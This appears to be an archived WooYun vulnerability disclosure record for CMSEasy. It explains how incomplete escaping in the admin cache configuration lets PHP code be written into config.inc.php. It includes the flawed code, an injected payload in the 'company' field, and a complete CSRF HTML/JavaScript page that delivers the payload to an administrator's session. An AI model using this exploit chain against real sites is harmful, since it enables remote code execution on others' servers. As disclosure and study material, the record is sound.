{"id": 51329, "wybug_id": "wooyun-2014-074941", "wybug_title": "cmseasy 后台缓存配置文件未过滤一个字符导致getshell", "wybug_corp": "cmseasy", "wybug_author": "menmen519", "wybug_date": "2014-09-04 12:08", "wybug_open_date": "2014-12-03 12:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向公众公开  简要描述： cmseasy 管理员身份 后台缓存配置文件，没有过滤一个字符导致getshell 详细说明：  啥都不说了 直接看代码：我们直接到\n\n然后我们分析一下代码:system.php:(lines:67):\nif(addslashes($_POST['customer_info']))\t\t\t{\t\t\t\t$customer_info='true';\t\t\t}else{\t\t\t\t$customer_info='false';\t\t\t}            $GLOBALS['celsysteminfo']->conf(addslashes($_POST['url']), addslashes($_POST['template']), addslashes($_POST['company']),addslashes($_POST['companyinfos']), addslashes($_POST['language']), $customer_info, addslashes($_POST['tracker_refresh']));            //提交修改后，需自动刷新一次，才能显示修改的内容            echo \"<script>window.history.go(-1);</script>\";        }\n我们跟进到$GLOBALS['celsysteminfo']->conf这个函数看看，在这里之前他进行了addslashes，分析一下，如果我们提交的一个值为aaa\\'  转义之后就是aaa\\\\\\' 那么我们进入：system.class.php:(14):\n$this->file = preg_replace(\"/\\['company'\\] = '.*';/\",'[\\'company\\'] = \\''.$company.'\\';',$this->file);\n这句正则表达式是有问题的 ，这里的this->file 就是我们的配置文件的内容，此文件位于celive/include/config.inc.php意思就是把这里面company里面的值替换掉，然后后面这个'[\\'company\\'] = \\''.$company.'\\'; 相加之后其中\\\\\\'会变成\\\\'故而产生漏洞，我们构造请求如下：\n\n发送一次看看这个文件有什么变化:\n\n我们在测试一下这里是否存在csrf，我们构造一个页面：\n<html>  <body>    <script>\t   function csrf_sql(){\t\t\tvar xhr = new XMLHttpRequest();\t\t\txhr.open(\"POST\", \"http://192.168.10.70/CmsEasy_5.5_UTF-8_20140818/uploads/celive/admin/system.php?action=systeminfo\", true);\t\t\txhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\t\t\txhr.withCredentials = \"true\";\t\t\tvar body='url=http%3A%2F%2F192.168.10.70%2FCmsEasy_5.5_UTF-8_20140818%2Fuploads%2Fcelive&company=sdssdadd%5C%27%3Bphpinfo%28%29%3B%2f%2f&customer_info=0&tracker_refresh=5000&template=default&language=chinese.php&systeminfo=systeminfo&submit=%E7%A1%AE%E8%AE%A4';\t\t\tvar aBody = new Uint8Array(body.length);\t\t\tfor (var i = 0; i < aBody.length; i++)\t\t\t  aBody[i] = body.charCodeAt(i);\t\t\txhr.send(new Blob([aBody]));\t   }\t \tcsrf_sql();    </script>  </body></html>\n我们放到另一台机器上去，然后发给管理员，管理员触发之后：\n\n成功发送，下来我们这里访问一下刚才那个配置文件\n\nok 这里没有给出csrf 诱惑管理员的方法，想必上一个sql来说，这个稍微弱一些，但是这个不需要数据库权限，故而还是挺严重的   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-09-05 13:08 厂商回复： 祝节日快乐 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-04 13:10 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  哥  我就知道你的沙发一定是我    \n     2014-09-24 11:29 |    \t\tStefanie \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:9        | 暂无)\t\t \n  服了。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}